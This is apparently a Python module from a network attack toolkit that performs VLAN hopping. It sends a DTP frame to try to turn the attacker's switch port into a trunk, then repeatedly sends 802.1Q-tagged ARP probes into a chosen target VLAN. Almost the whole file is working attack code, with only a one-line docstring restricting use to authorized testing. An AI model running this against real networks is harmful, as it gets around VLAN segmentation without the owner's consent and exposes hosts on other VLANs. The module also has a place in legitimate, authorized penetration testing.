"""VLAN hopping: reach a VLAN that the attacker's port does not belong to.

The attack has two steps. First, optionally, the port is negotiated into a trunk
with DTP advertisements (see switch spoofing). Second, frames carry an 802.1Q tag
for the target VLAN. On a trunk that allows that VLAN, the switch forwards the
frame into the VLAN, where a host or a monitor can see it. On an access port, the
switch should drop tagged frames.

This module sends the two steps. Whether the switch accepts the trunk, and whether it
forwards tagged frames for the target VLAN, depends on the switch configuration.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import ARP, Dot1Q, Ether, sendp
from scapy.packet import Packet

from macabre.attacks.arp_spoofing import parse_ipv4
from macabre.attacks.common import BROADCAST_MAC, Runner, normalize_unicast_mac, read_interface_mac, run_command
from macabre.attacks.switch_spoofing import build_dtp_frame

ARP_REQUEST = 1
ZERO_IP = "0.0.0.0"


@dataclass(frozen=True)
class VlanHoppingConfig:
    iface: str                  # attacker interface, on the access port under test
    target_vlan: int            # VLAN the frames are tagged with (1-4094)
    probe_ip: str = "192.0.2.1" # address in the probe ARP request (documentation range by default)
    negotiate: bool = True      # send a DTP advertisement first, to try a trunk
    count: int = 0              # tagged probe frames to send; 0 = until stopped
    interval: float = 1.0       # seconds between probe frames
    dry_run: bool = False       # build frames but do not send them

    def __post_init__(self) -> None:
        if not 1 <= self.target_vlan <= 4094:
            raise ValueError("The target VLAN must be between 1 and 4094.")
        parse_ipv4(self.probe_ip, "probe IP")


@dataclass
class VlanHoppingStats:
    sender_mac: str = ""
    dtp_sent: int = 0
    frames: int = 0
    status: str = ""


def build_hopping_frame(sender_mac: str, target_vlan: int, probe_ip: str) -> Packet:
    """ARP probe (RFC 5227 style, sender 0.0.0.0) tagged with `target_vlan`."""
    mac = normalize_unicast_mac(sender_mac)
    return (
        Ether(src=mac, dst=BROADCAST_MAC)
        / Dot1Q(vlan=target_vlan)
        / ARP(op=ARP_REQUEST, hwsrc=mac, psrc=ZERO_IP, hwdst="00:00:00:00:00:00", pdst=probe_ip)
    )


def run_vlan_hopping(
    config: VlanHoppingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[VlanHoppingStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> VlanHoppingStats:
    """Optionally negotiate a trunk, then send tagged probes for the target VLAN until stopped."""
    run = run or run_command
    send = send or sendp
    probe = parse_ipv4(config.probe_ip, "probe IP")

    if config.dry_run:
        stats = VlanHoppingStats(
            status=f"Dry run: would tag probes with VLAN {config.target_vlan}"
                   f"{' after a DTP advertisement' if config.negotiate else ''}. Nothing sent.",
        )
        on_progress(replace(stats))
        return stats

    sender_mac = read_interface_mac(config.iface, run)
    stats = VlanHoppingStats(sender_mac=sender_mac)
    if config.negotiate:
        send(build_dtp_frame(sender_mac), iface=config.iface, verbose=False)
        stats.dtp_sent = 1
        on_progress(replace(stats))
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        send(build_hopping_frame(sender_mac, config.target_vlan, probe), iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
